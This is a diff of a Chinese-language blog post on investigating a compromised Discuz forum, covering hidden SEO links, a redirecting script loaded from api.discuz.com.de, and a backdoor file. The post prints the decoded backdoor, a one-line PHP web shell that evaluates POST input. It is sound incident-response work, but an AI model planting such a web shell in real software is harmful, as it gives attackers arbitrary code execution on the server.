@@ -90,7 +90,7 @@
    有网友反映我们的论坛被挂了暗链，具体表现为从 <code>google</code> 搜索论坛名称结果如下图所示：
 </p>
 <p>
-   <img src="file:///home/tangxinfa/Projects/tangxinfa.github.com/static/site_attacked.png"  alt="file:///home/tangxinfa/Projects/tangxinfa.github.com/static/site_attacked.png" />
+   <img src="../../../posts/2014/04/01_8bba575b88ab6302669794fe95ee9898520667904e0e89e351b3/site_attacked.png"  alt="../../../posts/2014/04/01_8bba575b88ab6302669794fe95ee9898520667904e0e89e351b3/site_attacked.png" />
 </p>
 <p>   
    直接搜索论坛网址出现的一些热门帖子也被挂了暗链，通过 <code>google</code> 搜索结果访问会跳到恶意网站，
@@ -108,20 +108,20 @@
    直接通过网址访问论坛则没有任务问题，应该是论坛被注入了恶意代码，一时没被发现。
 </p>
 <ul>
-<li>在代码和数据库dump结果中搜索恶意站点信息，一无所获。
+<li>在代码和数据库dump结果中搜索恶意站点信息，一无所获
 
 </li>
-<li>然后怀疑是用户上传的图片中挂了马，特别是联想到首页最近刚上热图轮播，安装 <code>firefox</code> 插件 <code>ImageBlock</code> 让浏览器不加载图片，可是问题依旧。
+<li>然后怀疑是用户上传的图片中挂了马，特别是联想到首页最近刚上热图轮播，安装 <code>firefox</code> 插件 <code>ImageBlock</code> 让浏览器不加载图片，可是问题依旧
 
 </li>
-<li>打开 <code>firebug</code> 的 <code>Network</code> 标签，在页面加载记录中发现一个异常的js： <code>http://api.discuz.com.de/Seo.js</code> 
+<li>打开 <code>firebug</code> 的 <code>Network</code> 标签，在页面加载记录中发现一个异常的js加载： <code>http://api.discuz.com.de/Seo.js</code> 
 
 <p>     
      在代码和数据库中搜索这个js找不到任何信息。
 </p>
-<p>
-     将恶意站点配置一条hosts：
-</p>
+<ul>
+<li>将恶意站点配置一条 <code>hosts</code> 
+
 
 
 
@@ -129,11 +129,13 @@
 </pre>
 
 
-<p>
-     浏览器不再自动跳转到恶意网站了。 
+</li>
+</ul>
+
+<p>     浏览器不再自动跳转到恶意网站了。 
 </p>
 </li>
-<li>从 <code>google</code> 跳转到论坛后，查看页面源代码在最开始部分发现了引入这个js的语句。
+<li>从 <code>google</code> 跳转到论坛后，查看页面源代码在最开始部分发现了引入恶意js的语句
 
 
 
@@ -143,7 +145,7 @@
 
 
 </li>
-<li>在php脚本中加入 <code>echo</code> 语句逐步缩小范围，最终发现问题由下面一条语句引起：
+<li>在php脚本中加入 <code>echo</code> 语句逐步缩小范围，最终发现问题由下面一条语句引起
 
 
 
@@ -181,7 +183,7 @@
 
 
 </li>
-<li>参考 <a href="http://blog.i1728.com/post/99.html">网上的方法</a> 解码的结果
+<li>参考 <a href="http://blog.i1728.com/post/99.html">网上方法</a> 解码的结果
 
 
 
@@ -268,13 +270,10 @@ $<span style="color: #eeeeec;">filename</span>=$<span style="color: #eeeeec;">fi
 
 
 <p>
-   将通过比较svn中的代码与现网的代码还发现了一个新的后门程序
+   通过比较svn中的代码与现网的代码还发现了一个新的后门程序
 </p>
 <ul>
 <li><code>uc_client/control/class.php</code>
-</li>
-</ul>
-
 
 
 
@@ -283,7 +282,7 @@ $<span style="color: #eeeeec;">filename</span>=$<span style="color: #eeeeec;">fi
 </pre>
 
 
-<ul>
+</li>
 <li>解码后的结果
 
 
@@ -292,24 +291,24 @@ $<span style="color: #eeeeec;">filename</span>=$<span style="color: #eeeeec;">fi
 <pre class="src src-php">@<span style="color: #eeeeec; background-color: #2e3436;">eval(</span>$<span style="color: #8ae234;">_POST</span>[<span style="color: #ad7fa8; font-style: italic;">'wen'</span>]);
 </pre>
 
-
-<p>   
-     上面的脚本可以注入任意的代码。
-</p></li>
+</li>
 </ul>
 
 
+<p>   
+   上面的脚本可以注入任意的代码。
+</p>
 </div>
 
 </div>
 
 <div id="outline-container-5" class="outline-3">
-<h3 id="sec-5">总结</h3>
+<h3 id="sec-5">后记</h3>
 <div class="outline-text-3" id="text-5">
 
 
 <p>   
-   这次发现的恶意代码注入应该是之前的一次 <code>nginx</code> 和 <code>php</code> <a href="http://www.oschina.net/translate/10-tips-for-securing-nginx#translate_28443">安全漏洞</a> 引起，当时由 <code>WooYun.org</code> 汇报，也不知道已经被恶意用户种下了这些后门。
+   这次发现的恶意代码注入应该是之前的一次 <code>nginx</code> 和 <code>php</code> <a href="http://www.oschina.net/translate/10-tips-for-securing-nginx#translate_28443">安全漏洞</a> 引起，当时由 <code>WooYun.org</code> 汇报，原来已经被恶意用户种下了这些后门。
 </p></div>
 </div>
 
